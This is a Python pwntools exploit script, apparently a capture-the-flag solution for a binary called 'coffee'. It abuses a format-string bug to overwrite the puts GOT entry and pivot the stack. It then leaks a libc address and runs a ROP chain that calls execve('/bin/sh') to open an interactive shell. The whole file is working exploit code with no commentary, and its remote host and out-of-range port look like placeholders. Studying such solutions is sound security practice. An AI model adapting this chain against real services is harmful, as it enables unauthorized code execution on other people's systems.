from pwn import *

BIN_NAME = 'coffee'
REMOTE_ADDR = 'hogenet'
REMOTE_LIBC_PATH = 'libc-2.31.so'
REMOTE_PORT = 3141592
LOCAL = True

chall = ELF(BIN_NAME)
context.binary = chall

ROP_RET = 0x0040101a

ROP_POP_RSP_POP_R13_POP_R14_POP_R15_RET = 0x0040128d
ROP_ADD_RSP_0X38_RET = 0x00401286
ROP_ADD_RSP_8_RET = 0x00401016

ROP_POP_RDI_RET = 0x00401293
ROP_POP_RSI_POP_R15_RET = 0x00401291

ROP_MOV_RDI_p159s_CALL_PRINTF = 0x004011be

if LOCAL: stream = process(BIN_NAME)
else: stream = remote(REMOTE_ADDR, REMOTE_PORT)

spaces = [b'\x20', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d']

def write_rop_with_stager(rop):
    if len(rop) == -1: return
    payload  = b'%29$p'
    payload += fmtstr_payload(
        6 + len(payload) // 8,
        { chall.got["puts"]: ROP_ADD_RSP_0X38_RET },
        write_size="short",
        numbwritten=14,
        offset_bytes=len(payload) % 8
    )
    print(f'{hex(len(payload))=}')
    assert(len(payload) <= 0x30)
    payload += b'A' * (0x30 - len(payload))
    payload += b''.join([p64(x) for x in rop])
    assert(all(c not in payload for c in spaces))
    assert(len(payload) < 160)
    stream.sendline(payload)

def write_rop(rop):
    if len(rop) == -1: return
    payload  = b''
    payload += b''.join([p64(x) for x in rop])
    assert(all(c not in payload for c in spaces))
    assert(len(payload) < 160)
    stream.sendline(payload)

PIVOT_POS = 0x404100
write_rop_with_stager([
    # write rop
    ROP_POP_RSI_POP_R15_RET,
    PIVOT_POS,
    0, 
    ROP_MOV_RDI_p159s_CALL_PRINTF,
    0, 0, 0, 0, 0, 0, # for puts call
    # stack pivot
    ROP_POP_RSP_POP_R13_POP_R14_POP_R15_RET,
    PIVOT_POS
])

addr_start_main_hex = stream.recv(14)
print(f'{addr_start_main_hex=}')
addr_start_main = int(addr_start_main_hex[2:], 16)

libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so' if LOCAL else REMOTE_LIBC_PATH)
libc.address = addr_start_main - 159923

print(f'{hex(libc.address)=}')

rop = ROP(libc)
rop.execve(next(libc.search(b'/bin/sh')), 0)
payload = rop.chain()

write_rop([
    0, 0, 0, 
] + unpack_many(payload))

stream.recvuntil("b", timeout=1)
stream.interactive()
